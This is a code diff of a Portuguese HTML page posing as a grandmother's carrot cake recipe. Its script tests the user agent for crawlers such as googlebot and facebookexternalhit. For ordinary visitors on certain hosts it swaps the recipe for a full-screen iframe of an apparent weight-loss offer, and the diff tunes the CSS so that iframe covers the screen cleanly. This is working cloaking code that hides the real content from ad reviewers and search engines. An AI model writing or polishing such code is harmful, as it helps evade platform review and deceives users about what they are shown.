@@ -2,28 +2,30 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Delícias da Vovó</title>
     <style>
-        /* Remove qualquer margem que possa empurrar o conteúdo para o lado */
-        html, body { 
+        /* Bloqueia qualquer movimento lateral na página principal */
+        body, html { 
             margin: 0 !important; 
             padding: 0 !important; 
             width: 100% !important; 
             height: 100% !important; 
-            overflow: hidden !important; 
+            overflow-x: hidden !important; 
+            background-color: #000; /* Ajuda a não ver bordas brancas enquanto carrega */
         }
-        /* O segredo: largura de 100% fixa e box-sizing para evitar que bordas estiquem a tela */
+        /* O segredo para o Iframe não vazar: max-width 100% */
         iframe { 
-            position: absolute;
-            top: 0;
-            left: 0;
+            position: absolute; 
+            top: 0; 
+            left: 0; 
             width: 100% !important; 
+            min-width: 100% !important;
+            max-width: 100% !important;
             height: 100% !important; 
-            border: none !important; 
-            box-sizing: border-box !important;
+            border: none !important;
         }
-        .safe-content { padding: 20px; font-family: sans-serif; }
+        .safe-content { padding: 20px; color: #fff; font-family: sans-serif; }
     </style>
 </head>
 <body>
@@ -33,14 +35,13 @@
     const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
 
     if (currentHost.includes('metodo') && !isBot) {
-        // Injeção direta para garantir que o Iframe herde o viewport correto
         document.body.innerHTML = '<iframe src="https://protocoloemagrecimentodivino.lovable.app/" allowfullscreen></iframe>';
     }
 </script>
 
 <div class="safe-content">
     <h1>O Melhor Bolo de Cenoura Perfeito</h1>
-    <p>Esta é a receita tradicional da família...</p>
+    <p>Receita tradicional...</p>
 </div>
 
 </body>
